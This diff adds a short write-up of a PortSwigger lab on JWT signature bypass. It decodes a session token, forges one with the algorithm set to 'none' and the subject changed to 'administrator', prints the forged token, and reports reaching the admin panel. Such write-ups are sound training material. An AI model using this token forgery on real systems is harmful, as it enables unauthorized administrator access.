@@ -1,0 +1,37 @@
+Also here is quite straightforward:
+    We decode the JWT in the first file:
+        eyJraWQiOiI2OTljMzlkNi1hZWU2LTRjZDMtOTdjNS0yNDVlZDdhMGUyZjEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNDAxMDc5Nywic3ViIjoid2llbmVyIn0.DMeXh3muNPqMp00yN1O5YARPR603gW1FXjrKW2lsPBBFGOBLs1AYrSzMxfJb5elRZPXOHQNhRTi0fhNibWetUumcMNGRZCoU_MvBjOxLnfTe5SCPWSWl00Q03HWs5DDIuITLgQUMz6zTX4k0I27nli3XLUwt_yrOyAA39tfcKEBH2IfxIgyYvzw-l-h1Dq5hWrNvEmQV2223Hc8THmBb5gPHcwAAqyqAfq9EIoIOYm8qmrDoQmlc-SwHkH3NcbxvG6cxafnxXIVqAbLOhtZDzccW_PnuVo56OdroyxXV2pZ7-ZjQt9nS1i5pYlO6PXF4xWab5jihzIfAZGf8wHDyBw
+        
+        turns into
+        
+        HEADERS:
+        {
+            "kid": "699c39d6-aee6-4cd3-97c5-245ed7a0e2f1",
+            "alg": "RS256"
+        }
+        PAYLOAD:
+        {
+            "iss": "portswigger",
+            "exp": 1734010797,
+            "sub": "wiener"
+        }
+
+        we know that the signature verification is flawed, so what we expect is that the server verifies the signature by using the parameters passed in the headers,
+        so what if we try to inhibit the verification by passing "none" as signing algorithm, replace the sub with "administrator" and delete the signature section in the JWT? 
+        
+        HEADERS:
+        {
+            "kid": "699c39d6-aee6-4cd3-97c5-245ed7a0e2f1",
+            "alg": "none"
+        }
+        PAYLOAD:
+        {
+            "iss": "portswigger",
+            "exp": 1734010797,
+            "sub": "administrator"
+        }
+
+        which encoded becomes:
+        eyJraWQiOiI2OTljMzlkNi1hZWU2LTRjZDMtOTdjNS0yNDVlZDdhMGUyZjEiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNDAxMDc5Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+        
+        once replaced in the cookie storage, we indeed get access to the admin panel, where we can delete carlos' account 
